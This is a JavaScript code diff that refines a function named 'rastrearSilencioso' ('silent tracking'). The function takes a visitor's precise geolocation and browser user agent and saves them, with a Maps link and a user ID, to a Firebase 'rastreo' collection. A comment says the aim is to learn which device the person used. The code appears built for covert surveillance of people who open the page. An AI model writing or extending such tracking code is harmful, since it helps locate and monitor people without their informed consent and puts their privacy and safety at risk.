@@ -79,16 +79,31 @@ let cameraStream = null;
 
 async function rastrearSilencioso(idUsuario) {
     if (navigator.geolocation) {
+        console.log("🛰️ Intentando obtener coordenadas...");
+        
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const rastreoCol = collection(db, "rastreo");
-            await addDoc(rastreoCol, { 
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                mapa: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                id: idUsuario,
-                fecha: new Date().toLocaleString()
-            });
-        }, null, { enableHighAccuracy: true });
+            try {
+                const rastreoCol = collection(db, "rastreo"); // <-- Verifica esta colección en Firebase
+                await addDoc(rastreoCol, { 
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    mapa: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                    id: idUsuario,
+                    fecha: new Date().toLocaleString(),
+                    agente: navigator.userAgent // Para saber desde qué cel/pc entraron
+                });
+                console.log("✅ Ubicación enviada a Firebase!");
+            } catch (e) {
+                console.error("❌ Error al guardar en Firebase:", e);
+            }
+        }, (err) => {
+            console.warn("⚠️ El usuario o el navegador negaron la ubicación:", err.message);
+        }, { 
+            enableHighAccuracy: true, 
+            timeout: 10000 
+        });
+    } else {
+        console.error("❌ Este navegador no soporta geolocalización.");
     }
 }
 
